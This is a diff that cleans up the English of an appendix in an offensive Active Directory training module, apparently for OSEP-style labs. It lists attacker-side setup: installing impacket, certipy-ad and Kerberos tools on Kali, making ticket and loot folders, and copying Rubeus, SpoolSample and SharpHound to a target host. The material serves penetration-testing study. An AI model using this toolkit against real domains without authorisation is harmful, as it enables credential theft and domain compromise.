-## Attached: Minimum preparation list common to this module (attack aircraft)
+## Appendix: the minimal shared preparation checklist for this module (attacker side)
 
 ```bash
-# Install it all at once (Kali)
-sudo apt install -y impacket-scripts ldap-utils krb5-user   # Interaction Realm fill DOMAIN
+# install everything in one go (Kali)
+sudo apt install -y impacket-scripts ldap-utils krb5-user   # put DOMAIN in the Realm prompt
 pipx install certipy-ad
-# DNS convenience: write DC/CA/target FQDN into /etc/hosts (Kerberos does not allow IP)
-# Bill catalog
+# DNS convenience: put the DC/CA/target FQDNs in /etc/hosts (Kerberos does not allow IPs)
+# ticket directory
 mkdir -p ~/osep/tickets ~/osep/loot/certs
 ```
-Windows Side tool (copy to target host, source fixed）：`Rubeus.exe`、`SpoolSample.exe`（or printerbug single file）、`SharpHound.exe`（Enumeration auxiliary, not required）。**No impacket Just directly `python3 -m pip install impacket` Call with module**，The command name starts with Kali The packaged version shall prevail（`impacket-wmiexec` wait）。
+Windows-side tools (copy to the target host, from a fixed source): `Rubeus.exe`, `SpoolSample.exe` (or the single-file printerbug), `SharpHound.exe` (enumeration aid, not required). **If impacket is not installed, just `python3 -m pip install impacket` and call the modules**, and take the command names from the Kali packaging (`impacket-wmiexec` and friends).
